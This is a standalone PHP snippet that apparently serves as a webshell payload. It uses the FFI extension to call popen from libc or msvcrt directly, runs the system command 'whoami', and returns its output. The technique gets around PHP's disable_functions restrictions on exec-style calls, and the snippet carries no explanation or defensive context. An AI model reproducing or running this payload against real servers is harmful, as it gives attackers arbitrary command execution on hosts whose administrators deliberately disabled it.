ob_start();

if (!class_exists('FFI')) {
    ob_end_clean();
    return "ERROR: FFI class not available (PHP >= 7.4 + ffi.enable=1)";
}

$command = 'whoami';

try {
    if (DIRECTORY_SEPARATOR === '\\') {
        // Windows
        $libc = FFI::cdef("
            void* popen(const char *command, const char *type);
            char* fgets(char *buffer, int size, void *stream);
            int pclose(void *stream);
        ", "msvcrt.dll");
        $mode = "r";
    } else {
        // Linux
        $libc = FFI::cdef("
            void* popen(const char *command, const char *type);
            char* fgets(char *buffer, int size, void *stream);
            int pclose(void *stream);
        ", "libc.so.6");
        $mode = "r";
    }

    $cmd = $command . " 2>&1";
    $stream = $libc->popen($cmd, $mode);
    if ($stream == null) {
        ob_end_clean();
        return "ERROR: Failed to popen command";
    }

    $output = "";
    $buffer = $libc->new("char[4096]");
    while ($libc->fgets($buffer, 4096, $stream) !== null) {
        $line = FFI::string($buffer);
        if ($line === '') break;
        $output .= $line;
    }

    $libc->pclose($stream);

    ob_end_clean();
    return $output === "" ? "(no output)\n" : $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: FFI popen failed - " . $e->getMessage();
}
